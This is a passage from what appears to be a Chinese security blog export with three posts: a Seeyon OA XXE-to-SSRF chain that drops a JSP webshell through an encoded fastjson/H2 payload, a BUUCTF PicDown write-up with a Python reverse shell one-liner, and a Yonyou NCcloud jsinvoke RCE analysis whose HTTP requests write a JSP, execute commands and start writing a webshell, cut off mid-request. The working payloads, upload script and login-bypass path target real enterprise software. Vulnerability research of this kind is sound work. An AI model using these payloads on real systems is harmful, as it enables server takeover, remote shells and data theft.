分析我们都知道S1服务是开在内网的，致远OA是可以远程访问的，都是在同一台服务器上。而/agent/auth/authSave接口是可以get方式提交payload。所以只需要在致远中找到一个XXE外部实体注入打SSRF就可以实现组合利用了。\n可以通过工作流XML外部实体注入漏洞安全补丁补丁\nhttps://service.seeyon.com/patchtools/tp.html#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&amp;id=109\n\n\n\n\n\n\n\n在7.1sp1环境下\n补丁分析\n在com.seeyon.ctp.workflow.util.ImExportUtil的createImportMap方法中发现差异\n\n\n\n\n\n\n\n可以看到，没打补丁前，直接创建了SAXReader对象并调用了read方法，将file对象传入进去。未做任何处理直接传参，可通过控制文件内容实现外部实体注入。\nxxe 实现SSRF payload\nxxe5.txt\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE aaa [&lt;!ENTITY name SYSTEM \"http://aaa.11ctr6.dnslog.cn\" &gt;]&gt;&lt;name&gt;&amp;name;&lt;/name&gt;\n\n\n\n\n\n\n\n\n\n已经确定可以通过如上payload触发SSRF，接下来只需要找到利用该漏洞的source。\n漏洞利用点是在com.seeyon.ctp.workflow.util.ImExportUtil的createImportMap方法中，需要files变量可控。接下来找到createImportMap被调用的地方。\ncreateImportMap 在com/seeyon/ctp/workflow/manager/impl/WorkflowInnerApiManagerImpl中有两处调用。\n在com/seeyon/ctp/workflow/manager/impl/WorkflowInnerApiManagerImpl#importWorkFlow方法中\n\n\n\n\n\n\n\n该方法接收了一个files数组，便调用了ImExportUtil.createImportMap(files)方法。\nimportWorkFlow在com/seeyon/ctp/workflow/wapi/WorkflowApiManagerImpl#importWorkFlow中被调用\n\n\n\n\n\n\n\ncom/seeyon/ctp/workflow/wapi/WorkflowApiManagerImpl.importWorkFlow在com/seeyon/ctp/workflow/designer/controller/WorkFlowDesignerController.class中被调用\npublic ModelAndView importProcess(HttpServletRequest request, HttpServletResponse response) throws Exception &#123;        if (!(request instanceof MultipartHttpServletRequest)) &#123;            throw new IllegalArgumentException(\"Argument request must be an instantce of MultipartHttpServletRequest. [\" + request.getClass() + \"]\");        &#125; else &#123;            List&lt;ValidateResultVO&gt; validateResults = null;            boolean success = true;            ModelAndView modelAndView = new ModelAndView(\"ctp/workflow/workflowImportProcess\");            InputStream inputStream = null;            BufferedOutputStream out = null;            InputStream is = null;            FileOutputStream fos = null;            BufferedOutputStream bos = null;            try &#123;                MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest)request;                String maxUploadSizeExceeded = multipartRequest.getParameter(\"MaxUploadSizeExceeded\");                if (maxUploadSizeExceeded != null) &#123;                    throw new BusinessException(\"fileupload.exception.MaxSize\", new Object[]&#123;maxUploadSizeExceeded&#125;);                &#125;                String ex = multipartRequest.getParameter(\"unknownException\");                if (ex != null) &#123;                    throw new BusinessException(\"fileupload.exception.unknown\", new Object[]&#123;ex&#125;);                &#125;                Iterator fileNames = multipartRequest.getFileNames();                if (fileNames == null) &#123;                    ModelAndView var32 = modelAndView;                    return var32;                &#125;                label659:                while(true) &#123;                    MultipartFile fileItem;                    do &#123;                        Object name;                        do &#123;                            do &#123;                                if (!fileNames.hasNext()) &#123;                                    break label659;                                &#125;                                name = fileNames.next();                            &#125; while(name == null);                        &#125; while(\"\".equals(name));                        fileItem = multipartRequest.getFile(String.valueOf(name));                    &#125; while(fileItem == null);                    inputStream = fileItem.getInputStream();                    File tempFile = new File(\"./tempImportFile.zip\");                    if (tempFile.exists()) &#123;                        tempFile.delete();                    &#125;                    tempFile.createNewFile();                    try &#123;                        out = new BufferedOutputStream(new FileOutputStream(tempFile));                        int len = false;                        byte[] b = new byte[1024];                        int len;                        while((len = inputStream.read(b)) != -1) &#123;                            out.write(b, 0, len);                        &#125;                    &#125; catch (FileNotFoundException var51) &#123;                        logger.error(\"FileNotFoundException\", var51);                    &#125; finally &#123;                        if (out != null) &#123;                            out.close();                        &#125;                    &#125;                    File tempDir = new File(\"./tempImportFileDir\");                    int count;                    if (tempDir.exists() &amp;&amp; tempDir.isDirectory()) &#123;                        File[] childs = tempDir.listFiles();                        if (childs != null &amp;&amp; childs.length &gt; 0) &#123;                            File[] var23 = childs;                            count = childs.length;                            for(int var21 = 0; var21 &lt; count; ++var21) &#123;                                File file = var23[var21];                                file.delete();                            &#125;                            tempDir.delete();                        &#125;                    &#125;                    tempDir.mkdir();                    ZipFile tempZipFile = new ZipFile(tempFile);                    Enumeration&lt;ZipEntry&gt; entrys = tempZipFile.getEntries();                    String savepath = tempDir.getAbsolutePath() + File.separator;                    int count = true;                    byte[] buf = new byte[1024];                    while(true) &#123;                        ZipEntry zipEntry;                        String entryName;                        int index;                        do &#123;                            if (!entrys.hasMoreElements()) &#123;                                Map&lt;String, String&gt; resultMap = this.workflowApiManager.importWorkFlow((new File(tempDir.getAbsolutePath())).listFiles());                                long formAppId = 3126480965985782508L;                                validateResults = this.workflowApiManager.validateWorkflowForBusinessGenerator(formAppId);                                if (validateResults != null &amp;&amp; validateResults.size() &gt; 0) &#123;                                    success = false;                                &#125;                                continue label659;                            &#125;                            zipEntry = (ZipEntry)entrys.nextElement();                            entryName = zipEntry.getName();                            index = entryName.lastIndexOf(\"/\");                        &#125; while(index &gt; -1);                        File newFile = new File(savepath + entryName);                        boolean sucsess = newFile.createNewFile();                        try &#123;                            if (sucsess) &#123;                                is = tempZipFile.getInputStream(zipEntry);                                fos = new FileOutputStream(newFile);                                bos = new BufferedOutputStream(fos);                                while((count = is.read(buf)) &gt; -1) &#123;                                    bos.write(buf, 0, count);                                &#125;                                bos.flush();                            &#125;                            ... 忽略\n\n如上代码首先是从request请求对象中获取上传的文件fileItem，再创建一个tempImportFile.zip压缩文件，再将fileItem 写入tempImportFile.zip中，接着再创建一个tempImportFileDir目录，将tempImportFile.zip压缩包内文件挨个写入到tempImportFileDir目录下，在这个过程中，调用了this.workflowApiManager.importWorkFlow((new File(tempDir.getAbsolutePath())).listFiles());将tempImportFileDir目录下所有文件作为参数调用了workflowApiManager.importWorkFlow方法进行处理。仅接着调用ImExportUtil.createImportMap(files)方法，最后再调用SAXReader.read(file)处理上传的压缩包内的文件，压缩包内中的文件内容，我们可控，所以才产生了XXE漏洞。\n最后通过spring-workflow-controller.xml中的路由/workflow/designer.do指定method参数为importProcess可调用到com.seeyon.ctp.workflow.designer.controller.WorkFlowDesignerController方法\n\n\n\n\n\n\n\n整个调用链如下\n/workflow/designer.do    WorkFlowDesignerController#importProcess        WorkflowApiManagerImpl.importWorkFlow            WorkflowInnerApiManagerImpl.importWorkFlow                ImExportUtil.createImportMap\t                    SAXReader.read\n\n最后，只需要将我们的 xxe 实现SSRF的payload，保存成txt，并压缩成zip文件，通过/workflow/designer.do上传。\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE aaa [&lt;!ENTITY name SYSTEM \"http://fany.fwn3ji.dnslog.cn\" &gt;]&gt;&lt;name&gt;&amp;name;&lt;/name&gt;\n\n上传脚本\nimport requestsimport base64host = \"http://172.20.10.23\"headers = &#123;    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36\",    \"Cookie\": \"JSESSIONID=4BA348C973FF2EA93305F78D3CCC8C2D\"&#125;f = open(\"E:\\\\Desktop\\\\xxe5.zip\", 'rb')res = requests.post(url=host+\"/seeyon/workflow/designer.do?method=importProcess\", headers=headers, files=&#123;\"file\": f.read()&#125;, verify=False)print(res.text)\n\n\n\n\n\n\n\n\n\n构造SSRF攻击S1服务Payload通过以上对致远工作流XML外部实体注入的分析利用，已经可以 xxe 实现SSRF请求dnslog了，最后，只需要将fastjson的前台反序列化利用payload 进行组合，得到最终的xxe payload。\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE aaa [&lt;!ENTITY name SYSTEM \"http://127.0.0.1:60001/agent/auth/authSave?auth=CXsiQHR5cGUiOiJjb20uYWxpYmFiYS5mYXN0anNvbi5KU09OT2JqZWN0Iix7CgkJImEiOnsKCQkJIkB0eXBlIjoiamF2YS5sYW5nLkNsYXNzIiwKCQkJInZhbCI6Im9yZy5oMi5qZGJjeC5KZGJjRGF0YVNvdXJjZSIKCQl9LAoJCSJiIjp7CgkJCSJAdHlwZSI6Im9yZy5oMi5qZGJjeC5KZGJjRGF0YVNvdXJjZSIsCgkJCSJ1cmwiOiJqZGJjOmgyOm1lbTp0ZXN0O01PREU9TVNTUUxTZXJ2ZXI7SU5JVD1DUkVBVEUgQUxJQVMgc2hlbGw4IEFTICQkdm9pZCBzaGVsbDgoKSB0aHJvd3MgRXhjZXB0aW9uIHtqYXZhLmlvLlByaW50V3JpdGVyIHByaW50V3JpdGVyMiA9IG5ldyBqYXZhLmlvLlByaW50V3JpdGVyKFwiLi4vQXBhY2hlSmV0c3BlZWQvd2ViYXBwcy9ST09ULzQwNC5qc3BcIilcXDtTdHJpbmcgcyA9IFwiUENWQWNHRm5aU0JwYlhCdmNuUTlJbXBoZG1FdWRYUnBiQzRxTEdwaGRtRXVhVzh1S2l4cVlYWmhlQzVqY25sd2RHOHVLaXhxWVhaaGVDNWpjbmx3ZEc4dWMzQmxZeTRxSWlVK1BDVWhZMnhoYzNNZ1ZTQmxlSFJsYm1SeklFTnNZWE56VEc5aFpHVnlJSHNLQ1FsVktFTnNZWE56VEc5aFpHVnlJR01wSUhzS0NRa0pjM1Z3WlhJb1l5azdDZ2tKZlFvSkNYQjFZbXhwWXlCRGJHRnpjeUJuS0dKNWRHVmJYU0JpS1NCN0Nna0pDWEpsZEhWeWJpQnpkWEJsY2k1a1pXWnBibVZEYkdGemN5aGlMQ0F3TENCaUxteGxibWQwYUNrN0Nna0pmUW9KZlNVK0Nqd2xDblJ5ZVhzS0NRbFRkSEpwYm1jZ2EyVjVQU0k1TURCaVl6ZzROV1EzTlRVek16YzFJanNLQ1FseVpYRjFaWE4wTG5ObGRFRjBkSEpwWW5WMFpTZ2ljMnQ1SWl3Z2EyVjVLVHNLQ1FsVGRISnBibWNnWkdGMFlUMXlaWEYxWlhOMExtZGxkRkpsWVdSbGNpZ3BMbkpsWVdSTWFXNWxLQ2s3Q2drSmFXWWdLR1JoZEdFaFBTQnVkV3hzS1NCN0Nna0pDVk4wY21sdVp5QjJaWElnUFNCVGVYTjBaVzB1WjJWMFVISnZjR1Z5ZEhrb0ltcGhkbUV1ZG1WeWMybHZiaUlwT3dvSkNRbGllWFJsVzEwZ1kyOWtaVDF1ZFd4c093b0pJQ0FnSUNBZ0lDQnBaaUFvZG1WeUxtTnZiWEJoY21WVWJ5Z2lNUzQ0SWlrZ1BqMGdNQ2tnZXdvSklDQWdJQ0FnSUNBZ0lDQWdRMnhoYzNNZ1FtRnpaVFkwSUQwZ1EyeGhjM011Wm05eVRtRnRaU2dpYW1GMllTNTFkR2xzTGtKaGMyVTJOQ0lwT3dvSklDQWdJQ0FnSUNBZ0lDQWdUMkpxWldOMElFUmxZMjlrWlhJZ1BTQkNZWE5sTmpRdVoyVjBUV1YwYUc5a0tDSm5aWFJFWldOdlpHVnlJaXdnS0VOc1lYTnpXMTBwSUc1MWJHd3BMbWx1ZG05clpTaENZWE5sTmpRc0lDaFBZbXBsWTNSYlhTa2diblZzYkNrN0Nna2dJQ0FnSUNBZ0lDQWdJQ0JqYjJSbElEMGdLR0o1ZEdWYlhTa2dSR1ZqYjJSbGNpNW5aWFJEYkdGemN5Z3BMbWRsZEUxbGRHaHZaQ2dpWkdWamIyUmxJaXdnYm1WM0lFTnNZWE56VzExN1lubDBaVnRkTG1Oc1lYTnpmU2t1YVc1MmIydGxLRVJsWTI5a1pYSXNJRzVsZHlCUFltcGxZM1JiWFh0a1lYUmhMbWRsZEVKNWRHVnpLQ0pWVkVZdE9DSXBmU2s3Q2drZ0lDQWdJQ0FnSUgwZ1pXeHpaU0I3Q2drZ0lDQWdJQ0FnSUNBZ0lDQkRiR0Z6Y3lCQ1lYTmxOalFnUFNCRGJHRnpjeTVtYjNKT1lXMWxLQ0p6ZFc0dWJXbHpZeTVDUVZORk5qUkVaV052WkdWeUlpazdDZ2tnSUNBZ0lDQWdJQ0FnSUNCUFltcGxZM1FnUkdWamIyUmxjaUE5SUVKaGMyVTJOQzV1WlhkSmJuTjBZVzVqWlNncE93b0pJQ0FnSUNBZ0lDQWdJQ0FnWTI5a1pTQTlJQ2hpZVhSbFcxMHBJRVJsWTI5a1pYSXVaMlYwUTJ4aGMzTW9LUzVuWlhSTlpYUm9iMlFvSW1SbFkyOWtaVUoxWm1abGNpSXNJRzVsZHlCRGJHRnpjMXRkZTFOMGNtbHVaeTVqYkdGemMzMHBMbWx1ZG05clpTaEVaV052WkdWeUxDQnVaWGNnVDJKcVpXTjBXMTE3WkdGMFlYMHBPd29KSUNBZ0lDQWdJQ0I5Q2drSkNVTnBjR2hsY2lCaklEMGdRMmx3YUdWeUxtZGxkRWx1YzNSaGJtTmxLQ0pCUlZNaUtUc0tDUWtKWXk1cGJtbDBLRElzSUc1bGR5QlRaV055WlhSTFpYbFRjR1ZqS0d0bGVTNW5aWFJDZVhSbGN5Z3BMQ0FpUVVWVElpa3BPd29KQ1FsdVpYY2dWU2gwYUdsekxtZGxkRU5zWVhOektDa3VaMlYwUTJ4aGMzTk1iMkZrWlhJb0tTa3VaeWhqTG1SdlJtbHVZV3dvWTI5a1pTa3BMbTVsZDBsdWMzUmhibU5sS0NrdVpYRjFZV3h6S0hCaFoyVkRiMjUwWlhoMEtUc0tDUWw5Q2dsOVkyRjBZMmdvUlhoalpYQjBhVzl1SUdVcGV3cDlPd3B2ZFhROWNHRm5aVU52Ym5SbGVIUXVjSFZ6YUVKdlpIa29LVHNLSlQ0PVwiXFw7U3RyaW5nIGRlY29kZVN0cmluZyA9IG5ldyBTdHJpbmcoamF2YS51dGlsLkJhc2U2NC5nZXREZWNvZGVyKCkuZGVjb2RlKHMpLFwiVVRGLThcIilcXDtwcmludFdyaXRlcjIucHJpbnRsbihkZWNvZGVTdHJpbmcpXFw7cHJpbnRXcml0ZXIyLmNsb3NlKClcXDt9JCRcXDtTRUxFQ1Qgc2hlbGw4KClcXDsiLAoJCX0sCgkJImxhbmd1YWdlIjp7IkB0eXBlIjoiamF2YS5sYW5nLlN0cmluZyJ7IiRyZWYiOiIkIn0KCX19IiJ9\" &gt;]&gt;&lt;name&gt;&amp;name;&lt;/name&gt;\n\n提交，停顿一会，就会在致远的ROOT路径下生成webshell。\n\n\n\n\n\n\n\n\n当然，致远的/workflow/designer.do接口是需要登录才能访问的。\n\n\n\n\n\n\n\n在致远7.1SP1这个版本，可通过/seeyon/autoinstall.do/..;/workflow/designer.do绕过登录权限校验实现前台RCE，具体原理暂时就先不分析。\n\n\n\n\n\n\n\n总结这次分析的致远这套组合拳漏洞利用单从实战上来说，目前能打的只有在内网了。不过从学习的角度来说，确实能让我这个审计新手能学到了很多。分析的时候遇到的许多问题，如fastjson 打 h2 的利用链这条链，也是多亏pockyray师傅的指点迷津，才能迎刃而解，感谢师傅。\n","categories":["代码审计","漏洞分析"],"tags":["java代码审计"]},{"title":"BUUCTF-WEB 【网鼎杯 2020 白虎组】PicDown 1","url":"/2021/08/22/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84%5DPicDown%201/","content":"考点文件包含（python）\n代码审计（python）\n命令执行（python）\n前置知识python反弹shellpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n解题过程打开\n就一个输入框，提交数据后会跳转到page页面，请求参数名为url，感觉像ssrf，其实不是，但还是可以通过传入 url链接去读取网页源代码，并且返回为 一个名为 beautiful.jpg的文件，用文本打开实际上是个网页。\n\n尝试包含 /etc/passwd\n\n也成功包含出来。\n非预期解这里直接尝试包含了下 /flag ,发现直接包含了出来。\n\n预期解接下来通过读取 /proc/self/cmdline 来查看当前进程的执行命令\n\n读取 app.py，得到\nfrom flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = \"/tmp/secret.txt\"f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route('/')def index():    return render_template('search.html')@app.route('/page')def page():    url = request.args.get(\"url\")    try:        # url参数值中不能以字符 file 开头         if not url.lower().startswith(\"file\"):            # 打开url            res = urllib.urlopen(url)            # 读取            value = res.read()            # 返回            response = Response(value, mimetype='application/octet-stream')            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'            return response        else:            value = \"HACK ERROR!\"    except:        value = \"SOMETHING WRONG!\"    return render_template('search.html', res=value)@app.route('/no_one_know_the_manager')def manager():    key = request.args.get(\"key\")    print(SECRET_KEY)    if key == SECRET_KEY:        shell = request.args.get(\"shell\")        # 执行命令        os.system(shell)        res = \"ok\"    else:        res = \"Wrong Key!\"    return resif __name__ == '__main__':    app.run(host='0.0.0.0', port=8080)\n\n代码审计通过审计，发现在manager函数中存在命令执行，有一个条件，没有过滤。\nif key == SECRET_KEY:\n\n传入的 key 要等于 SECRET_KEY，那么这个SECRET_KEY 要怎么获取呢。\nSECRET_FILE = \"/tmp/secret.txt\"f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)\n\n通过上面代码可以知道，从/tmp/secret.txt 中读取到SECRET_KEY后就会把这个文件删除，这就会导致我们读取不到。\nLinux当中，文件只要没有关闭，就会读取到内存当中，就算是remove也是一样，打开的文件存在/proc/[pid]/fd路径下，这个路径下有很多以数字保存的文件，例如 /proc/self/fd/1这样。\nbp启动，爆破。\n\n得到\n\ngetshellkey = request.args.get(\"key\")    print(SECRET_KEY)    if key == SECRET_KEY:        shell = request.args.get(\"shell\")        # 执行命令        os.system(shell)        res = \"ok\"\n\n拿到看KEYCRET_KEY，就可以执行命令了，但是这里即便执行成功，也只会返回ok，这里我们用python反弹shell。\n先在服务器当监听\n\n构造payload\nno_one_know_the_manager?key=TdCTIhB6KGIVLP1AYx623LPgIFlKIZeXjQEIecV1ZtA=&amp;shell=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\nurl编码\npython%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22IP%22,PORT));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(%5B%22/bin/sh%22,%22-i%22%5D);'%0A\n\n提交，在根目录下。\n\n总结这道题没什么难度，考得都很是常识，但我就是偏偏不会，通过读取 /proc/self/cmdline 来查看当前进程的执行命令，通过读取/proc/self/fd/1 查看在内存中的文件，学到了学到了。\n","categories":["CTF","BUUCTF"],"tags":["CTF","文件包含(Python)","代码审计(Python)","命令执行(Python)"]},{"title":"用友NCcloud jsinvoke接口反射调用RCE","url":"/2024/04/05/%E7%94%A8%E5%8F%8BNCcloud%20jsinvoke%E6%8E%A5%E5%8F%A3%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8RCE/","content":"复现环境nccloud 2105\n补丁https://security.yonyou.com/#/noticeInfo?id=280\n\n\n\n\n\n\n\n漏洞分析漏洞接口为/uapjs/jsinvoke，全局搜索jsinvoke找到hotwebs/uapjs/WEB-INF/web.xml文件中，/jsinvoke/*路由对应的servlet为nc.bs.framework.js.servlet.JsInvokeServlet。\n\n\n\n\n\n\n\nnc.bs.framework.js.servlet.JsInvokeServlet这个类所在的jar包并不在对应路径的lib下，可以随便找个路由远程调试，使用idea的执行表达式功能，反射加载该类并输出该类在那个路径下，再将其添加到库中。\nClass clazz = Class.forName(&quot;nc.bs.framework.js.servlet.JsInvokeServlet&quot;);clazz.getProtectionDomain().getCodeSource().getLocation()\n\n\n\n\n\n\n\n\n跟入到JsInvokeServlet中，调用了this.internal的service方法，this.internal为nc.bs.framework.js.servlet.InternalJsInvokeServlet类的实例对象，调用的也就是InternalJsInvokeServlet的service方法。\n\n\n\n\n\n\n\n跟入InternalJsInvokeServlet类中，service调用了invoke方法，在invoke方法中首先调用了CommandFactory.getCommand(request)去拿到一个ICommand对象。\n\n\n\n\n\n\n\n在CommandFactory.getCommand方法中，从request中获取action参数，来创建不同的对象，并返回，在创建对象的时候会从request中读取数据作为参数进行创建。漏洞利用的点是在InvokeCommand对象中，所以需要传入invoke。\n\n\n\n\n\n\n\n回到nc.bs.framework.js.servlet.InternalJsInvokeServlet的invoke方法中，接下来会调用InvokeCommand的execute方法。\n\n\n\n\n\n\n\n在execute方法中，会将this.data反序列化成MethodInvocation对象，这里的this.data是在CommandFactory.getCommand方法中执行readJSONString(request);被设置的，是请求时body中传递的json字符串，会将json的值赋值到MethodInvocation对象的属性中。\n\n\n\n\n\n\n\n主要的反射调用逻辑在handler.handleMethodInvocation(invocation)，创建了MethodInvocationHandler对象，以MethodInvocation对象作为参数调用了handleMethodInvocation方法。\n\n\n\n\n\n\n\n跟入到MethodInvocationHandler的handleMethodInvocation方法中，通过ServiceName作为参数调用NCLocator.getInstance().lookup(invocation.getServiceName())方法，获得一个Object对象，在将这个对象作为参数调用invocation.invoke(stub)。\n\n\n\n\n\n\n\n首先是调用了NCLocator.getInstance()拿到一个NCLocator对象，拿到的是ServerNCLocator对象。\n\n\n\n\n\n\n\n随后会调用ServerNCLocator的lookup方法，紧接着会执行BusinessAppServer.getInstance().getServerContext().lookup(name);，最终会调用到nc.bs.framework.server.AbstractContext的lookup方法。\n\n\n\n\n\n\n\n在nc.bs.framework.server.AbstractContext的lookup方法中，过程看起来比较复杂。\n\n\n\n\n\n\n\n首先会判断name的前缀是否以-&gt;开头，是的话会截取-&gt;后的字符串，调用this.findMeta(name)获取ComponentMeta对象，然后以ComponentMeta对象作为参数调用this.findComponent(meta)获取Object对象进行返回。\n\n\n\n\n\n\n\n不是的话，会调用this.getServiceCache().get(name)从缓存中拿到Object对象，没在缓存中，会判断前缀是否以java:comp/env/开头，那么会调用jndiCtx.lookup(name)进行加载，拿到retObject对象。\n\n\n\n\n\n\n\nname既不是以-&gt;开头，也不是java:comp/env/开头，会调用this.findMeta(name)去获取ComponentMeta对象。\n\n\n\n\n\n\n\n跟入到this.findMeta(name)方法中\n\n\n\n\n\n\n\n最终会调用到nc.bs.framework.server.AbstractContainer的getMeta方法，this.publicRepo是一个PublicMetaRepo对象，metas和nameIndices为该类的属性。\n\n\n\n\n\n\n\ngetComponentMeta方法则是通过name在nameIndices中查找对应的ComponentMeta对象并返回。\n\n\n\n\n\n\n\n最后会根据ComponentMeta对象调用this.findComponent(meta)。\n\n\n\n\n\n\n\n获取实例并返回。\n\n\n\n\n\n\n\n最后回到nc.bs.framework.js.rmi.MethodInvocationHandler的handleMethodInvocation方法中\n\n\n\n\n\n\n\n跟入invocation.invoke(stub)，对指定的serviceName和methodName进行反射调用。\n\n\n\n\n\n\n\n通过如上分析，可以知道最终是可以反射调用一些特定的类的方法，并不是所有的类的方法都能够调用，只能是this.publicRepo中nameIndices这个属性中的，数量还比较多，大概有1w多个，那么只需要在这里面筛选出一些有危害的可利用的类进行反射调用来利用。\n利用类nc.bs.iufo.base.BaseSPService就是保存在nameIndices这个属性当中，该类的saveXStreamConfig方法可传入url和config两个参数，url可控制写入路径，config可控制写入的文件内容，但是写入的文件内容是在xml中，这里选择用EL表达式来进行利用。\npublic void saveXStreamConfig(Object config, String url) &#123;        FileOutputStream fos = null;        OutputStreamWriter writer = null;        BufferedWriter bufferedWriter = null;        try &#123;            URL resource = ResourceManager.getResource(url);            File file = null;            if (resource != null) &#123;                file = new File(resource.getFile());            &#125; else &#123;                file = new File(url);            &#125;            if (!file.exists()) &#123;                File parent = file.getParentFile();                if (!parent.exists()) &#123;                    parent.mkdirs();                &#125;                file.createNewFile();            &#125;            if (!file.canWrite()) &#123;                file.setWritable(true);            &#125;            fos = new FileOutputStream(file, false);            writer = new OutputStreamWriter(fos, Charset.forName(\"UTF-8\"));            String xmlContent = getXStream().toXML(config);            bufferedWriter = new BufferedWriter(writer);            bufferedWriter.write(xmlContent);            bufferedWriter.close();        &#125; catch (Exception var22) &#123;            AppDebug.debug(var22);            throw new RuntimeException(url + \" Writer Error: \" + var22.toString(), var22);        &#125; finally &#123;            if (fos != null) &#123;                try &#123;                    fos.close();                &#125; catch (IOException var21) &#123;                &#125;            &#125;            if (writer != null) &#123;                try &#123;                    writer.close();                &#125; catch (IOException var20) &#123;                &#125;            &#125;            if (bufferedWriter != null) &#123;                try &#123;                    bufferedWriter.close();                &#125; catch (IOException var19) &#123;                &#125;            &#125;        &#125;    &#125;\n\n漏洞利用首先需要写入动态执行js表达式payload\nPOST /uapjs/jsinvoke?action=invoke HTTP/1.1Host: 172.20.10.190:8080User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeIf-Modified-Since: Mon, 11 May 2020 15:41:36 GMTIf-None-Match: W/&quot;370397-1670602379000&quot;Content-Type: application/x-www-form-urlencodedContent-Length: 797&#123;&quot;serviceName&quot;:&quot;nc.itf.iufo.IBaseSPService&quot;,&quot;methodName&quot;:&quot;saveXStreamConfig&quot;,&quot;parameterTypes&quot;:[&quot;java.lang.Object&quot;,&quot;java.lang.String&quot;],&quot;parameters&quot;:[&quot;\\u0024\\u007b\\u0070\\u0061\\u0072\\u0061\\u006d\\u005b\\u0070\\u0061\\u0072\\u0061\\u006d\\u002e\\u0068\\u005d\\u0028\\u0029\\u005b\\u0070\\u0061\\u0072\\u0061\\u006d\\u002e\\u0061\\u005d\\u0028\\u0070\\u0061\\u0072\\u0061\\u006d\\u002e\\u0062\\u0029\\u005b\\u0070\\u0061\\u0072\\u0061\\u006d\\u002e\\u0063\\u005d\\u0028\\u0029\\u005b\\u0070\\u0061\\u0072\\u0061\\u006d\\u002e\\u0064\\u005d\\u0028\\u0070\\u0061\\u0072\\u0061\\u006d\\u002e\\u0065\\u0029\\u005b\\u0070\\u0061\\u0072\\u0061\\u006d\\u002e\\u0066\\u005d\\u0028\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u002e\\u0068\\u0029\\u007d&quot;,&quot;\\u0077\\u0065\\u0062\\u0061\\u0070\\u0070\\u0073\\u002f\\u006e\\u0063\\u005f\\u0077\\u0065\\u0062\\u002f\\u0034\\u0030\\u0033\\u002e\\u006a\\u0073\\u0070&quot;]&#125;\n\n\n\n\n\n\n\n\n命令执行回显POST /403.jsp HTTP/1.1Host: 172.20.10.190:8080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: login_locale=zh_CN; tenantId=default; JSESSIONID=85D55653F05E679FF6FE026CEE6E4FAD.serverx-forwarded-for: 9.9.9.9x-originating-ip: 9.9.9.9x-remote-ip: 9.9.9.9x-remote-addr: 9.9.9.9h:var p = java.lang.Runtime.getRuntime().\\u0065\\u0078\\u0065\\u0063(&apos;whoami&apos;);var sc = new java.util.Scanner(p.\\u0067\\u0065\\u0074\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d(),&quot;GBK&quot;).useDelimiter(&apos;\\\\A&apos;);var result = sc.hasNext() ? sc.next() : &apos;&apos;;sc.close();result;Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 99h=getClass&amp;a=forName&amp;b=javax.script.ScriptEngineManager&amp;c=newInstance&amp;d=getEngineByName&amp;e=js&amp;f=eval\n\n\n\n\n\n\n\n\n写入webshellPOST /403.jsp HTTP/1.1Host: 172.20.10.190:8080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: login_locale=zh_CN; tenantId=default; JSESSIONID=85D55653F05E679FF6FE026CEE6E4FAD.serverx-forwarded-for: 9.9.9.9x-originating-ip: 9.9.9.9x-remote-ip: 9.9.9.9x-remote-addr: 9.9.9.9h:var path = &quot;Li93ZWJhcHBzL25jX3dlYi81MDEuanNw&quot;;var classLoader = java.lang.Thread.currentThread().getContextClassLoader();var decoder = classLoader.loadClass(&quot;sun.misc.BASE64Decoder&quot;).newInstance();var decodePath = null;decodePath = new java.lang.String(decoder.decodeBuffer(path), &quot;UTF-8&quot;);var ps2 = new java.io.PrintStream(decodePath);var shell = 